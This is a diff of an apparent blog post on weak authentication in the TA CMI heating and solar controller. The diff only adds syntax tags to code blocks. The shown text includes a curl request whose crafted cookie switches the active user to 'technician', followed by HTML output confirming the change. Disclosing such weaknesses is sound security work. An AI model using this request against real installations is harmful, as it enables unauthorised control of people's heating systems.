@@ -26,7 +26,7 @@ Going further - can we get more information through CMI? We can do it with privi
 Given that entire authentication is based on HTTP basic and client cookie it [shows how weak TA CMI security is](https://www.ta.co.at/en/x2-operation-interfaces/cmi/). Sadly it is nothing surprising in the field of "hardware" (even if software is to blame). With network scanner or even brute force method attacker can take control over your entire heating or solar installation.  
 See below example of malicious request:
 
-```
+```bash
 curl 'http://cmi/INCLUDE/devpagex.cgi?pagex2=010a5800' \
     -H 'Authorization: Basic ....' \
     -H 'Cookie: canremote1=2A372DBBD'
@@ -34,7 +34,7 @@ curl 'http://cmi/INCLUDE/devpagex.cgi?pagex2=010a5800' \
 
 It will result in activation of "technician" user. It is proved by `akt` css class in below output.
 
-```
+```html
 <div class="HEADLINE">User</div>
 <div class="HEADLINE_M">Current user</div>
 <div id="afe" >
@@ -48,7 +48,7 @@ It will result in activation of "technician" user. It is proved by `akt` css cla
 
 After removal of cookie we will get `akt` css class next to regular user.
 
-```
+```html
 <div class="HEADLINE">User</div>
 <div class="HEADLINE_M">Current user</div>
 <div id="afe" >
